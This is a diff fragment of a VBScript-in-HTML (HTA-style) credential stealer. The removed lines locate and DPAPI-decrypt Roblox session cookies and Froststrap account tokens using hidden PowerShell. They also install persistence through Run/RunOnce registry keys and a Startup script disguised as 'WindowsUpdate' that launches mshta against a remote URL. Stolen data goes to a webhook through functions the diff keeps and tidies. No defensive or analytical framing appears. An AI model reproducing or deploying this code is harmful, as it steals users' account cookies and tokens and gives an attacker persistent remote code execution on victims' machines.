+    End If
+    Set rx = Nothing
+End Function
 
-        If Left(ln, 7) = "ROBLOX|" Then
-            Call PostEmbed("Roblox Cookie", Mid(ln, 8), 65280)
-        End If
+Function TmpFile(n)
+    TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & n
+End Function
 
-        NextLine:
-    Next
+Function ReadFile(p)
+    Dim f : Set f = fso.OpenTextFile(p, 1) : ReadFile = f.ReadAll : f.Close : Set f = Nothing
+End Function
+
+Sub SafeDel(p)
+    On Error Resume Next
+    If fso.FileExists(p) Then fso.DeleteFile p, True
+    On Error GoTo 0
 End Sub
-
-Sub GrabRoblox()
-    Dim paths(4)
-    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
-    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
-    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
-    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
-    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
-
-    Dim j, fp, raw
-    For j = 0 To 4
-        If fso.FileExists(paths(j)) Then fp = paths(j) : Exit For
-    Next
-
-    ' UWP fallback
-    If Len(fp) = 0 Then
-        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
-        If fso.FolderExists(pk) Then
-            Dim folder, subf
-            Set folder = fso.GetFolder(pk)
-            For Each subf In folder.SubFolders
-                If InStr(UCase(subf.Name), "ROBLOX") > 0 Then
-                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
-                    If fso.FileExists(uwp) Then fp = uwp : Exit For
-                End If
-            Next
-            Set folder = Nothing
-        End If
-    End If
-    If Len(fp) = 0 Then Exit Sub
-
-    raw = ReadFile(fp)
-    If Len(raw) < 50 Then Exit Sub
-
-    Dim cookie: cookie = ""
-    If InStr(raw, "_|WARNING") > 0 Then cookie = raw
-    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
-        Dim sp: sp = InStr(raw, "CookiesData"":""")
-        If sp > 0 Then
-            sp = sp + 14
-            Dim ep: ep = InStr(sp, raw, """")
-            If ep > sp Then
-                Dim b64: b64 = Mid(raw, sp, ep - sp)
-                If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
-            End If
-        End If
-    End If
-    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
-        Dim rp: rp = InStr(raw, ".ROBLOSECURITY"): cookie = Mid(raw, rp)
-    End If
-    If Len(cookie) = 0 Then cookie = raw
-
-    cookie = Replace(Replace(Replace(cookie, vbCr, ""), vbLf, ""), vbTab, "")
-    cookie = Trim(cookie)
-    Dim sc: sc = InStr(cookie, ";"): If sc > 0 Then cookie = Left(cookie, sc - 1)
-    cookie = Trim(cookie)
-    Dim warn: warn = InStr(cookie, "_|WARNING"): If warn > 1 Then cookie = Mid(cookie, warn)
-
-    If Len(cookie) < 20 Then Exit Sub
-    Call PostEmbed("Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280)
-    Call PostFile("cookie.txt", cookie)
-End Sub
-
-Sub GrabFroststrap()
-    Dim fp: fp = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Froststrap\Cache\AccountManager.json"
-    If Not fso.FileExists(fp) Then
-        Dim fdir: fdir = sh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap\InstallLocation")
-        If fdir <> "" Then fp = fdir & "\Cache\AccountManager.json"
-    End If
-    If Not fso.FileExists(fp) Then Exit Sub
-
-    Dim outf: outf = TmpPath("frost_out.txt")
-    Dim ps: ps = _
-        "Add-Type -AssemblyName System.Security;" & _
-        "$p='" & fp & "';" & _
-        "$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');" & _
-        "$j=Get-Content $p -Raw|ConvertFrom-Json;" & _
-        "$lines=@();" & _
-        "foreach($a in $j.accounts){" & _
-            "try{" & _
-                "$eb=[Convert]::FromBase64String($a.SecurityToken);" & _
-                "$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);" & _
-                "$c=[Text.Encoding]::UTF8.GetString($db)" & _
-            "}catch{$c='DECRYPT FAILED'};" & _
-            "$lines+=$a.Username+' ['+$a.UserId+'] : '+$c" & _
-        "};" & _
-        "($lines -join [char]10)|Out-File '" & outf & "' -Encoding utf8"
-
-    Dim psf: psf = TmpPath("frost.ps1")
-    WriteFile psf, ps
-    sh.Run "powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
-    fso.DeleteFile psf, True
-
-    If fso.FileExists(outf) Then
-        Dim result: result = ReadFile(outf)
-        fso.DeleteFile outf, True
-        If Len(Trim(result)) > 0 Then
-            Call PostEmbed("Froststrap Accounts", result, 3447003)
-            Call PostFile("froststrap.txt", result)
-        End If
-    End If
-End Sub
-
-Sub Persistence()
-    Dim payload: payload = "mshta https://riggercheck.app/"
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
-
-    Dim sp: sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
-    Dim sf: Set sf = fso.CreateTextFile(sp, True)
-    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
-    sf.Close: Set sf = Nothing
-
-    Call PostEmbed("Persistence", "3 startup methods installed | PC: " & PC & " | " & USER, 65280)
-End Sub
-
-' ===================== EXFIL =====================
 
 Sub PostEmbed(t, d, c)
-    If WH = "(put webhook here)" Then Exit Sub
-    Dim DQ: DQ = Chr(34)
-    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    Dim DQ, j, h
+    DQ = Chr(34)
+    j  = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & _
+              DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & _
+              DQ & "color" & DQ & ":" & c & "}]}"
+    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
+    On Error Resume Next
     h.Open "POST", WH, False
     h.SetRequestHeader "Content-Type", "application/json"
     h.Send j
+    On Error GoTo 0
     Set h = Nothing
 End Sub
 
 Sub PostFile(fn, ct)
-    If WH = "(put webhook here)" Then Exit Sub
-    Dim DQ: DQ = Chr(34)
-    Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
-    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    Dim DQ, b, bd, h
+    DQ = Chr(34)
+    b  = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
+    bd = "--" & b & vbCrLf & _
+         "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & _
+         ct & vbCrLf & "--" & b & "--"
+    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
+    On Error Resume Next
     h.Open "POST", WH, False
     h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
     h.Send bd
+    On Error GoTo 0
     Set h = Nothing
 End Sub
-
-' ===================== UTILITIES =====================
-
-Function TmpPath(name): TmpPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
-
-Sub WriteFile(path, content)
-    Dim f: Set f = fso.CreateTextFile(path, True)
-    f.Write content: f.Close: Set f = Nothing
-End Sub
-
-Function ReadFile(path)
-    ReadFile = ""
-    Dim f: Set f = fso.OpenTextFile(path, 1)
-    ReadFile = f.ReadAll: f.Close: Set f = Nothing
-End Function
-
-Sub SleepSeconds(s)
-    sh.Run "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul", 0, True
-End Sub
-
-Sub SleepMinutes(m): Call SleepSeconds(m * 60): End Sub
-
-Function DecryptDPAPI(b64)
-    DecryptDPAPI = ""
-    Dim inf: inf = TmpPath("dpi.txt")
-    Dim outf: outf = TmpPath("dpo.txt")
-    fso.DeleteFile outf, True
-    WriteFile inf, b64
-    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
-    Dim psf: psf = TmpPath("dpapi.ps1")
-    WriteFile psf, ps
-    sh.Run "powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
-    If fso.FileExists(outf) Then
-        If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
-    End If
-    fso.DeleteFile inf, True: fso.DeleteFile psf, True: fso.DeleteFile outf, True
-End Function
 
 Function Ej(s)
     Ej = s
@@ -326,5 +601,6 @@ Function Ej(s)
     Ej = Replace(Ej, vbLf,   Chr(92) & "n")
     Ej = Replace(Ej, vbTab,  Chr(92) & "t")
 End Function
+
 </script>
 </head><body></body></html>
